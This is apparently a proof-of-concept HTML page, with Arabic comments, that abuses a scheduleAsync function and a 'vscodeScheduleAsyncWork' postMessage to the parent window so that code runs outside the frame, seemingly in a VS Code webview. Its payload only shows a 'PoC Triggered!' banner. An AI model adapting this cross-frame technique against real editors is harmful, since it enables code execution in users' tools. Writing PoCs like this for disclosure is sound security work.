<!DOCTYPE html>
<html>
<head>
  <title>POC1</title>
</head>
<body>
  <h1>Loading exploit...</h1>

  <script>
    // 1. تسجيل callback
    let callbackId = null;

    function maliciousAction() {
      const d = document.createElement("div");
      d.innerText = "🔥 PoC Triggered!";
      d.style.background = "red";
      d.style.color = "white";
      d.style.fontSize = "30px";
      d.style.position = "fixed";
      d.style.top = "10px";
      d.style.left = "10px";
      d.style.zIndex = "999999";
      document.body.appendChild(d);
}


    // هل يوجد scheduleAsync؟
    if (window.scheduleAsync) {
      window.scheduleAsync(() => {
        // هذا الكود سينفذ داخل الـ parent window
        maliciousAction();
      }).then(id => {
        callbackId = id;

        // 2. بعد الحصول على ID، نرسل postMessage للـ parent
        parent.postMessage({
          vscodeScheduleAsyncWork: callbackId
        }, "*");
      }).catch(err => {
        console.error("scheduleAsync error:", err);
      });
    } else {
      document.body.innerHTML = "<h2>scheduleAsync not available</h2>";
    }
  </script>
</body>
</html>
